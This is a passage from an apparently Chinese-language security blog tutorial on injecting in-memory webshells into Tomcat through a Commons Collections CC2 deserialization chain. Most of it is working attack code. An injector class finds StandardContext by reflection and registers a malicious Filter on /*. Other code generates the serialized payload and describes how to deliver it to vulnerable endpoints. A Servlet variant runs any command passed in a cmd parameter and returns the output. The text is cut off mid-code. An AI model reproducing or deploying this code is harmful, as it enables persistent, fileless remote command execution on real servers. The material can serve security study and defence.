class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">            filterDef.setFilterName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">            filterDef.setFilter(filter);</span><br><span class="line">            filterDef.setFilterClass(filterClass.getName());</span><br><span class="line"></span><br><span class="line">            <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">            filterMap.setFilterName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">            filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line"></span><br><span class="line">            ctx.addFilterDef(filterDef);</span><br><span class="line">            ctx.addFilterMap(filterMap);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// filterStart() 和手动塞 filterConfigs 的区别：</span></span><br><span class="line">            <span class="comment">// filterStart()：让 Tomcat 自己遍历所有已注册的 FilterDef，统一初始化生成 filterConfigs，走标准流程</span></span><br><span class="line">            <span class="comment">// 手动塞 filterConfigs：绕过 filterStart()，直接反射拿到 filterConfigs 这个 Map，手动创建</span></span><br><span class="line">            <span class="comment">//   ApplicationFilterConfig 塞进去，更底层，副作用更小（不影响其他正常 Filter）</span></span><br><span class="line">            <span class="comment">// 两种方式都能让内存马生效，手动塞更稳一点，这里用 filterStart() 简化操作</span></span><br><span class="line">            ctx.filterStart();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;注入成功&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为什么要从线程类加载器入手，而不是从 request 拿？</span></span><br><span class="line">    <span class="comment">// JSP 版本能用 request.getSession().getServletContext() 是因为 JSP 本身就在一个 HTTP 请求的处理过程中</span></span><br><span class="line">    <span class="comment">// 但 MemShellInject 的构造函数是被 CC2 链触发的，执行环境是反序列化的上下文，</span></span><br><span class="line">    <span class="comment">// 不在任何 HTTP 请求里，根本没有 request 可以用，所以只能从线程类加载器入手</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 为什么能从类加载器拿到 StandardContext？</span></span><br><span class="line">    <span class="comment">// Tomcat 给每个 Web 应用都分配了独立的类加载器（ParallelWebappClassLoader）</span></span><br><span class="line">    <span class="comment">// 这个类加载器内部持有一个 resources 字段，指向 WebResourceRoot（通常是 StandardRoot 实例）</span></span><br><span class="line">    <span class="comment">// 而 StandardRoot 里又有一个 context 字段指向当前应用的 StandardContext</span></span><br><span class="line">    <span class="comment">// 链路：</span></span><br><span class="line">    <span class="comment">//   Thread.currentThread().getContextClassLoader()</span></span><br><span class="line">    <span class="comment">//     → ParallelWebappClassLoader.resources</span></span><br><span class="line">    <span class="comment">//       → StandardRoot.context</span></span><br><span class="line">    <span class="comment">//         → StandardContext（目标！）</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 对比 JSP 的方式：</span></span><br><span class="line">    <span class="comment">//   request → getSession() → getServletContext() → ApplicationContext → StandardContext</span></span><br><span class="line">    <span class="comment">//   两条路终点都是 StandardContext，只是起点不同</span></span><br><span class="line">    <span class="keyword">private</span> StandardContext <span class="title function_">getStandardContext</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">resourcesField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        Class&lt;?&gt; clazz = cl.getClass();</span><br><span class="line">        <span class="comment">// 向上遍历父类查找 resources 字段，兼容不同版本 Tomcat 的类继承关系</span></span><br><span class="line">        <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                resourcesField = clazz.getDeclaredField(<span class="string">&quot;resources&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (resourcesField == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        resourcesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">resources</span> <span class="operator">=</span> resourcesField.get(cl);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 拿到 resources（StandardRoot）之后，再反射取 context 字段，强转成 StandardContext 返回</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> resources.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">context</span> <span class="operator">=</span> contextField.get(resources);</span><br><span class="line">        <span class="keyword">if</span> (context <span class="keyword">instanceof</span> StandardContext) &#123;</span><br><span class="line">            <span class="keyword">return</span> (StandardContext) context;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// AbstractTranslet 的抽象方法，必须实现，但这里不需要任何逻辑，空实现就行</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM dom, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM dom, DTMAxisIterator it, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Step3：获取组件字节码"><a href="#Step3：获取组件字节码" class="headerlink" title="Step3：获取组件字节码"></a>Step3：获取组件字节码</h3><p>先把 <code>EvilFilter</code> 和 <code>MemShellInject</code> 都编译好，用 Javassist 提取字节数组：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetBytes</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// Javassist 的类池，可以理解为一个类的仓库，通过它来操作 .class 文件</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从类池里找到 EvilFilter，转成字节数组，再转成 Base64 字符串输出</span></span><br><span class="line">        <span class="comment">// 这个 Base64 要填进 MemShellInject 构造函数里的 b64 变量</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ct1</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.demo.EvilFilter&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] filterBytes = ct1.toBytecode();</span><br><span class="line">        System.out.println(<span class="string">&quot;EvilFilter Base64: &quot;</span> + Base64.getEncoder().encodeToString(filterBytes));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 同样从类池里找到 MemShellInject，转成字节数组输出</span></span><br><span class="line">        <span class="comment">// 这个字节数组要填进 CC2 链的 _bytecodes 里</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ct2</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.demo.MemShellInject&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] injectBytes = ct2.toBytecode();</span><br><span class="line">        System.out.println(<span class="string">&quot;MemShellInject bytes: &quot;</span> + Arrays.toString(injectBytes));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行先得到 EvilFilter 的 Base64 数据：</p>
+<blockquote>
+<p><code>yv66vg</code> 是 Java 字节码文件魔数 <code>CA FE BA BE</code> 的 Base64 编码结果。所以看到一段 Base64 字符串开头是 <code>yv66vg</code>，基本可以确定这是一个 Java <code>.class</code> 文件编码后的结果。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421135920028.png"></p>
+<p>把 EvilFilter 的 Base64 字符串填进 <code>MemShellInject</code> 里的 <code>b64</code> 变量，重新编译，再次运行 GetBytes 拿到 <code>MemShellInject</code> 的字节数组：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421141517599.png"></p>
+<p>输出的字节数组开头是 <code>-54, -2, -70, -66</code>，对应的就是 <code>CA FE BA BE</code>，Java 字节码的魔数，没问题。</p>
+<hr>
+<h3 id="Step4：套入利用链生成-Payload"><a href="#Step4：套入利用链生成-Payload" class="headerlink" title="Step4：套入利用链生成 Payload"></a>Step4：套入利用链生成 Payload</h3><p>以 CC2 链为例，核心结构是 <code>PriorityQueue → TransformingComparator → InvokerTransformer → TemplatesImpl</code>。把 <code>MemShellInject</code> 的字节码填入 <code>TemplatesImpl._bytecodes</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 填入 MemShellInject 的字节数组（把 Step3 拿到的数组填进来）</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = &#123;-<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="comment">/* ... */</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 把内存马字节码塞进 TemplatesImpl</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;pwn&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造 CC2 链</span></span><br><span class="line">        <span class="comment">// 先用无害的 ConstantTransformer 占位，防止 add 的时候提前触发</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(templates);</span><br><span class="line">        queue.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 塞完再换成真正的 InvokerTransformer，触发 newTransformer()</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;transformer&quot;</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化输出 bin 文件 + Base64</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos)) &#123;</span><br><span class="line">            oos.writeObject(queue);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] payload = baos.toByteArray();</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;memshell.bin&quot;</span>)) &#123;</span><br><span class="line">            fos.write(payload);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(payload));</span><br><span class="line">        System.out.println(<span class="string">&quot;memshell.bin 生成完成&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行后生成序列化的 Base64 数据：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421142104451.png"></p>
+<hr>
+<h3 id="Step5：发送到目标触发注入"><a href="#Step5：发送到目标触发注入" class="headerlink" title="Step5：发送到目标触发注入"></a>Step5：发送到目标触发注入</h3><p><strong>文件上传型漏洞</strong>：直接上传 <code>memshell.bin</code> 文件到漏洞接口。</p>
+<p><strong>参数型漏洞</strong>：把 Base64 字符串粘进表单提交。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421142221782.png"></p>
+<p>有报错提示不管，这是正常的，因为 <code>TemplatesImpl</code> 实例化我们的恶意类时会抛 <code>ClassCastException</code>，但构造函数在报错之前已经执行完了，内存马已经注入进去了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421142245584.png"></p>
+<p>直接访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/项目名/任意路径?cmd=calc</span><br></pre></td></tr></table></figure>
+
+<p>成功弹出计算器：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421140833022.png"></p>
+<p>重启 Tomcat 服务再次访问显示 404，证明刚才生效的是内存马，不是文件落地的 WebShell：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421142434611.png"></p>
+<hr>
+<h3 id="关于匿名内部类的替代写法"><a href="#关于匿名内部类的替代写法" class="headerlink" title="关于匿名内部类的替代写法"></a>关于匿名内部类的替代写法</h3><p>上面的方式是单独写一个 <code>EvilFilter.java</code>，编译后转 Base64 填进 <code>MemShellInject</code>，然后通过 <code>defineClass</code> 加载。</p>
+<p>还有另一种更简洁的写法：<strong>直接在 <code>MemShellInject</code> 里写内部匿名类</strong>，不需要 Base64 和 <code>defineClass</code> 那一套：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接在构造函数里 new Filter()&#123;&#125; 写匿名内部类</span></span><br><span class="line"><span class="comment">// 编译后就是 MemShellInject$1.class，不需要单独写 EvilFilter.java</span></span><br><span class="line"><span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">    <span class="comment">// ... 实现逻辑</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>但这样 <code>MemShellInject</code> 编译后会生成两个 <code>.class</code> 文件：</p>
+<ul>
+<li><code>MemShellInject.class</code></li>
+<li><code>MemShellInject$1.class</code>（匿名内部类）</li>
+</ul>
+<p>塞进 <code>_bytecodes</code> 的时候两个都要带上：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] injectBytes = ...;  <span class="comment">// MemShellInject.class 的字节数组</span></span><br><span class="line"><span class="type">byte</span>[] innerBytes  = ...;  <span class="comment">// MemShellInject$1.class 的字节数组</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// _bytecodes 是二维数组，两个都塞进去</span></span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;injectBytes, innerBytes&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>这里有个细节要注意，看一下 <code>TemplatesImpl</code> 的 <code>defineTransletClasses</code> 源码：</p>
+<p>它会把 <code>_bytecodes</code> 里继承 <code>AbstractTranslet</code> 的类的字节数据全部 <code>defineClass</code> 动态加载到 <code>_class[]</code> 里。然后有一段：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (superClass.getName().equals(<span class="string">&quot;AbstractTranslet&quot;</span>)) &#123;</span><br><span class="line">    transletIndex = i; <span class="comment">// 记录下标</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>会根据 <code>AbstractTranslet</code> 来确定下标，在 <code>getTransletInstance()</code> 里用 <code>_class[_transletIndex].newInstance()</code> 来实例化。这意味着无论 <code>_class[]</code> 里有多少内部匿名类，被实例化的只有继承了 <code>AbstractTranslet</code> 的那个类。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421175444422.png"></p>
+<p>所以传入 <code>&#123;injectBytes, innerBytes&#125;</code> 也能正确实例化 <code>MemShellInject</code>，接着 <code>MemShellInject</code> 再触发 <code>MemShellInject$1</code> 的实例化，逻辑上没问题。</p>
+<p>但如果 <code>_bytecodes</code> 里有多个继承 <code>AbstractTranslet</code> 的类，<code>transletIndex</code> 会被后面的覆盖，最终只实例化最后一个。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设 A 和 B 都继承了 AbstractTranslet</span></span><br><span class="line"><span class="comment">// 遍历顺序：A → B</span></span><br><span class="line"><span class="comment">// transletIndex 先指向 A，再被 B 覆盖，最终实例化 B</span></span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;A, B&#125;); <span class="comment">// 最终实例化的是 B</span></span><br></pre></td></tr></table></figure>
+
+<p>不过实际注入场景里一般不会有这个问题，因为注入器只需要一个主类，匿名内部类继承的是功能类（<code>HttpServlet</code>、<code>Filter</code> 等），不会继承 <code>AbstractTranslet</code>。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421175714544.png"></p>
+<hr>
+<h2 id="Filter-内存马注入实现"><a href="#Filter-内存马注入实现" class="headerlink" title="Filter 内存马注入实现"></a>Filter 内存马注入实现</h2><p>上面的 Step1 ～ Step5 整个流程就是 Filter 内存马的完整实现，这里不重复了。核心是：</p>
+<ul>
+<li>恶意类实现 <code>Filter</code> 接口，在 <code>doFilter</code> 里执行命令</li>
+<li>通过 <code>FilterDef + FilterMap + filterStart()</code> 注册进 Tomcat</li>
+<li>路径映射 <code>/*</code>，任意路径带 <code>cmd</code> 参数即可触发</li>
+</ul>
+<hr>
+<h2 id="Servlet-内存马注入实现"><a href="#Servlet-内存马注入实现" class="headerlink" title="Servlet 内存马注入实现"></a>Servlet 内存马注入实现</h2><p>Servlet 的注入逻辑和 Filter 类似，恶意类换成继承 <code>HttpServlet</code>，注册方式有所不同，用的是 <code>Wrapper</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Wrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MInjectServlet</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MInjectServlet</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">ctx</span> <span class="operator">=</span> getStandardContext();</span><br><span class="line">            <span class="keyword">if</span> (ctx == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 直接写匿名内部类，不需要 Base64 和 defineClass 那一套</span></span><br><span class="line">            <span class="comment">// 编译后就是 MInjectServlet$1.class</span></span><br><span class="line">            <span class="type">HttpServlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpServlet</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span></span><br><span class="line">                        <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">                        <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">                        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                        String line;</span><br><span class="line">                        <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                            sb.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        resp.getWriter().write(sb.toString());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 注册到 Tomcat</span></span><br><span class="line">            <span class="comment">// Filter 注册：FilterDef + FilterMap + filterStart()</span></span><br><span class="line">            <span class="comment">// Servlet 注册：Wrapper + addChild + addServletMappingDecoded</span></span><br><span class="line">            <span class="comment">// Wrapper 是 Tomcat 里每个 Servlet 的运行容器，一个 Servlet 对应一个 Wrapper</span></span><br><span class="line">            <span class="comment">// 注册进 StandardContext 之后绑定路径就生效了</span></span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> ctx.createWrapper();</span><br><span class="line">            wrapper.setName(<span class="string">&quot;evilServlet&quot;</span>);</span><br><span class="line">         